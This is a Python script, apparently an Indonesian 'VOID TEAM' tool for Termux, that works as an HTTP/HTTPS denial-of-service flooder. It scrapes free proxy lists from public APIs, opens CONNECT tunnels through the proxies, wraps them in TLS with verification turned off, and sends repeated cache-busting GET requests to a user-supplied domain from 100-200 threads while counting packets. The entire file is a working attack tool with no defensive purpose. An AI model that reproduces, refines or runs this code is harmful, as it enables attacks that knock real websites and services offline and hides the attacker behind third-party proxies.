import os
import sys
import threading
import socket
import random
import time
import ssl

# --- AUTO INSTALLER ---
try:
    import requests
except ImportError:
    print("[!] Library 'requests' hilang. Menginstall otomatis...")
    os.system("pip install requests")
    import requests

# --- UI VOID TEAM ---
def setup_ui():
    os.system('clear')
    print("\033[1;31m")
    print("  __      ______ _____ _____    _  __ _   _  ____  ")
    print("  \ \    / / __ \_   _|  __ \  | |/ /| \ | |/ __ \ ")
    print("   \ \  / / |  | || | | |  | | | ' / |  \| | |  | |")
    print("    \ \/ /| |  | || | | |  | | |  <  | . ` | |  | |")
    print("\n [ TERMUX ALL-IN-ONE ] [ BY: VOID TEAM ]")
    print("\033[0m")

sent_packets = 0
proxies = []
lock = threading.Lock()

def scrape_proxies():
    global proxies
    print("[*] Mengambil amunisi proxy dari berbagai sumber...")
    sources = [
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000",
        "https://www.proxy-list.download/api/v1/get?type=http"
    ]
    for url in sources:
        try:
            r = requests.get(url, timeout=10)
            if r.status_code == 200:
                proxies.extend(r.text.splitlines())
        except: continue
    print(f"[+] Berhasil mendapatkan {len(proxies)} proxy!")

def get_headers(domain):
    path = f"/?v={random.getrandbits(32)}"
    headers = f"GET {path} HTTP/1.1\r\n" \
              f"Host: {domain}\r\n" \
              f"User-Agent: Mozilla/5.0 (Android; Mobile; rv:122.0) Gecko/122.0 Firefox/122.0\r\n" \
              f"Accept: */*\r\n" \
              f"Connection: keep-alive\r\n\r\n"
    return headers.encode()

def attack(domain):
    global sent_packets
    while True:
        try:
            proxy = random.choice(proxies).strip().split(':')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((proxy[0], int(proxy[1])))
            
            # HTTP CONNECT Tunneling
            s.sendall(f"CONNECT {domain}:443 HTTP/1.1\r\nHost: {domain}\r\n\r\n".encode())
            s.recv(1024)

            ctx = ssl._create_unverified_context()
            ssls = ctx.wrap_socket(s, server_hostname=domain)
            
            payload = get_headers(domain)
            for _ in range(50):
                ssls.sendall(payload)
                with lock:
                    sent_packets += 1
            ssls.close()
        except:
            try: s.close()
            except: pass

def monitor(domain):
    while True:
        with lock:
            print(f"\r\033[1;32m [+][VOID] Paket: {sent_packets} | Target: {domain}\033[0m", end="")
        time.sleep(1)

# --- EXECUTION ---
setup_ui()
target = input("\033[1;36m [?] Target (pastigacorbos.site): \033[0m")
threads = int(input("\033[1;36m [?] Threads (Rec for Termux: 100-200): \033[0m"))

scrape_proxies()
if not proxies:
    print("[!] Gagal ambil proxy. Serangan dibatalkan.")
    sys.exit()

threading.Thread(target=monitor, args=(target,), daemon=True).start()

for i in range(threads):
    threading.Thread(target=attack, args=(target,)).start()
